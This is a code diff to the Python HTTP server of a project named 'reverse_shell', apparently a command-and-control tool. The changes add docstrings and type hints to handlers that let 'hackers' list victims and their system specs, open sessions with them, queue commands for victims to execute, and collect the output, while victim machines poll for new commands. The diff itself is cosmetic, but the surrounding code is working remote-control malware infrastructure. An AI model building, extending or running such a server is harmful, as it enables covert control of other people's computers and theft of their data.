@@ -12,6 +12,7 @@ from http.server import BaseHTTPRequestHandler, HTTPServer
 from typing import Any, Callable, Optional
 
 import typ.json as js
+import sqlite3 as sq
 
 import reverse_shell.server.server_helper as sh
 import reverse_shell.utils as ut
@@ -113,11 +114,12 @@ class ZrevshellServer(BaseHTTPRequestHandler):
     # ----------Utility methods ---------- #
 
     def c_send_error(self, code: HTTPStatus):
+        """A function that sends status_codes and ends headers, useful if the error code is the only error to be sent."""
         self.send_response(code)
         self.end_headers()
 
-    def check_verified_request(self):
-        """Check if the request is verified by ensuring the existence and validity of auth_token
+    def check_verified_request(self) -> bool:
+        """Checks if the request is verified by ensuring the existence and validity of auth_token
         and existence of the client-id header"""
 
         client_id = self.headers.get(
@@ -146,13 +148,15 @@ class ZrevshellServer(BaseHTTPRequestHandler):
                     return True
 
         # Well if the user doesn't pass through the above it means the client ain't
-        # verified so let's tell that to the client
+        # verified so let's inform that to the client.
         self.c_send_error(HTTPStatus.UNAUTHORIZED)
         return False
 
-    def get_client_type_from_db(self, client_id: str):
-        """Get the client type of a specified client from the database. This could also be a means to check if the client
-        has verified itself."""
+    def get_client_type_from_db(self, client_id: str) -> Optional[int]:
+        """Gets the client type of a specified client from the database and return `None` if not found.
+        This could also be a means to check if the client has verified itself.
+        Since there could be no client that is verified but has not registered itself.
+        """
         # query data from the database
         usr_client_type = self.database.query(
             "SELECT client_type FROM clients WHERE client_id=?", [client_id]
@@ -174,9 +178,11 @@ class ZrevshellServer(BaseHTTPRequestHandler):
         ]
         return result[0]
 
-    def get_header_token(self, token_name: str, fallback=None):
-        """Get a header field and return it decoded, use `fallback` if decode error happened and `None` if the header doesn't exist"""
-        token = self.headers.get(token_name, None)
+    def get_header_token(
+        self, token_name: str, fallback: Optional[str] = None
+    ) -> Optional[str]:
+        """Gets a header field(token) and return it decoded, use `fallback` if decode error happened and `None` if the header doesn't exist"""
+        token: Optional[str] = self.headers.get(token_name, None)
 
         try:
             if token is not None:
@@ -185,8 +191,11 @@ class ZrevshellServer(BaseHTTPRequestHandler):
         except (b64decodeError, UnicodeDecodeError):
             return fallback
 
-    def insert_victim_info_db(self, victim_id: str, json_str: str):
-        """Insert victims info and specs to the victim_info database. returns None if some error happens"""
+    def insert_victim_info_db(
+        self, victim_id: str, json_str: str
+    ) -> Optional[sq.Cursor]:
+        """Inserts victims info and specs to the victim_info database. returns `None` if some error happens and the database `Cursor`
+        if the operation ran smoothly."""
         try:
             victim_info = js.loads(VictimInfo, json_str)
         except (js.json.decoder.JSONDecodeError, js.JsonError):
@@ -216,12 +225,13 @@ class ZrevshellServer(BaseHTTPRequestHandler):
                 [victim_id, *[None for _ in range(5)]],
             )
 
-    def check_verified_for_cmd(self, cmd: str, client_type: int):
-        """Check if a client is verified to access a server command."""
+    def check_verified_for_cmd(self, cmd: str, client_type: int) -> bool:
+        """Checks if a client is verified to access a server command."""
         return client_type in self.config.server_cmd_privileges.get(cmd, [])
 
-    def get_req_body(self):
-        """Decode and do everything to read from the body of the request and return the parsed response."""
+    def get_req_body(self) -> Optional[str]:
+        """Decodes and reads the body of the request and returns the parsed response.
+        Returns `None` if a decode error occurred."""
         # Get the content length.
         try:
             content_length = int(self.headers.get("content-length", 0))
@@ -242,26 +252,23 @@ class ZrevshellServer(BaseHTTPRequestHandler):
 
         return decoded_data
 
-    def get_client_status(self, client_id: str):
+    def get_client_status(self, client_id: str) -> Optional[int]:
         """Retrieve the current client status from the database"""
-        result = self.database.query(
+        result: Optional[list[tuple[int]]] = self.database.query(
             "SELECT status FROM clients WHERE client_id=?", (client_id,)
         )
         # if an error happened our response will be None
         if result is None or len(result) == 0:
             return None
-        # Fix bug where we assume 0 is the return value
-        # but the reality was (0)
+        # Return the status.
         return result[0][0]
 
     def validate_session(
         self, client_id: str, client_type: int, requested_session: str
-    ):
+    ) -> sh.HandlerResponse:
         """Validate the requested session with the session_id the client is actually in.
-        Returns a boolean a success and failure. It will return None if the session is dead.
+        Returns a `HandlerResponse` object that can be returned from the command handler methods.
         """
-        # * We will re configure how this method responds with data
-        # * it should accept the client_type of the victim
 
         # Very simple we'll check one condition that's
         # if the requested_session_id and the real_session_id match
@@ -312,7 +319,7 @@ class ZrevshellServer(BaseHTTPRequestHandler):
     def handle_cmd_list_victims(
         self, client_id: str, client_type: int, req_body: str | None
     ):
-        """Handling the command 'list_victims'"""
+        """Handles the 'list_victims' command that allows a hacker to list victims with their information(specs)."""
         # Ok so this is going to be simple, open the database, read all the clients and
         # return them.
         # TODO: Making the result filterable
@@ -358,7 +365,8 @@ class ZrevshellServer(BaseHTTPRequestHandler):
     def handle_cmd_exit_session(
         self, client_id: str, client_type: int, req_body: str | None
     ):
-        """Handle the exit_session command."""
+        """Handles the exit_session that allows hackers to dismiss a session with a victim.
+        The victim will be also notified and will hop out of the session."""
         # Ok we're going to follow procedures as they do
         # in other session using commands
         session_id = req_body
@@ -386,7 +394,7 @@ class ZrevshellServer(BaseHTTPRequestHandler):
     def handle_cmd_register(
         self, client_id: str, client_type: int, req_body: str | None
     ):
-        """Do what needs to be done if the server command sent is 'register'."""
+        """Handles the 'register' command that allows clients to be registered(stored in the servers database)."""
         # First let's check if the user is already in the database
         result = self.database.query(
             "SELECT * FROM clients WHERE client_id=?",
@@ -422,7 +430,8 @@ class ZrevshellServer(BaseHTTPRequestHandler):
     def handle_cmd_get_session(
         self, client_id: str, client_type: int, req_body: str | None
     ):
-        """Handle the get_session command"""
+        """Handle the get_session command that allows victims to obtain a session_id key if any hacker
+        created a session with them."""
 
         session_id = self.hacking_sessions.get_session_id(client_id)
 
@@ -439,7 +448,8 @@ class ZrevshellServer(BaseHTTPRequestHandler):
     def handle_cmd_fetch_cmd(
         self, client_id: str, client_type: int, req_body: str | None
     ):
-        """Handle fetch_cmd commands"""
+        """Handle fetch_cmd commands that the victim will call in a loop to obtain the latest
+        commands that the hacker has sent."""
         session_id = req_body
 
         # Check if there is no body(session_id) provided if not we need
@@ -477,7 +487,9 @@ class ZrevshellServer(BaseHTTPRequestHandler):
     def handle_cmd_fetch_res(
         self, client_id: str, client_type: int, req_body: str | None
     ):
-        """Handle and serve the fetch_res command"""
+        """Handle the fetch_res command that allows hackers to get the latest responses in
+        individual lines with metadata attached.
+        """
         # First let's try to read the request body, if it's None or ''
         # report a bad request
         requested_session_id = req_body
@@ -486,9 +498,11 @@ class ZrevshellServer(BaseHTTPRequestHandler):
             return sh.HandlerResponse(False, HTTPStatus.BAD_REQUEST)
 
         # Session validation
-        response = self.validate_session(client_id, client_type, requested_session_id)
-        if not response.successful:
-            return response
+        validate_session_response = self.validate_session(
+            client_id, client_type, requested_session_id
+        )
+        if not validate_session_response.successful:
+            return validate_session_response
 
         # If all's good let's fetch the response and send it to the hacker
         # with a beautiful OK response code.
@@ -513,7 +527,8 @@ class ZrevshellServer(BaseHTTPRequestHandler):
     def handle_cmd_post_res(
         self, client_id: str, client_type: int, req_body: str | None
     ):
-        """Do what needs to be done to handle the 'post_res' server command."""
+        """Handles the post_res command that allows victims to post their responses to the session
+        for hackers to access."""
         # First check if the req_body is None and send an error
         if req_body is None:
             return sh.HandlerResponse(False, HTTPStatus.BAD_REQUEST)
@@ -551,7 +566,8 @@ class ZrevshellServer(BaseHTTPRequestHandler):
     def handle_cmd_post_cmd(
         self, client_id: str, client_type: int, req_body: str | None
     ):
-        """Do what needs to be done if the server command is 'post_cmd'"""
+        """Handles the 'post_cmd' command that allows hackers to issue a command for the respective victims in
+        their sessions to execute."""
         # Bad request return message
         bad_request = sh.HandlerResponse(False, HTTPStatus.BAD_REQUEST)
 
@@ -583,7 +599,8 @@ class ZrevshellServer(BaseHTTPRequestHandler):
     def handle_cmd_create_session(
         self, client_id: str, client_type: int, req_body: str | None
     ):
-        """Do what needs to be done when the command sent is 'create_session'"""
+        """Handles the 'create_session' command that allows hackers to create sessions
+        with victims."""
         # Keep in mind that the req_body in this case is actually the victim_id itself
         # not in json format but plain string.
         victim_id = req_body
@@ -626,7 +643,7 @@ class ZrevshellServer(BaseHTTPRequestHandler):
     def handle_cmd_delete_hacker(
         self, client_id: str, client_type: int, req_body: str | None
     ):
-        """Let the hacker delete itself from the server database."""
+        """Lets the hacker delete itself from the server database."""
         # Delete the hacker from the database
         result = self.database.execute(
             "DELETE FROM clients WHERE client_id=?", [client_id]
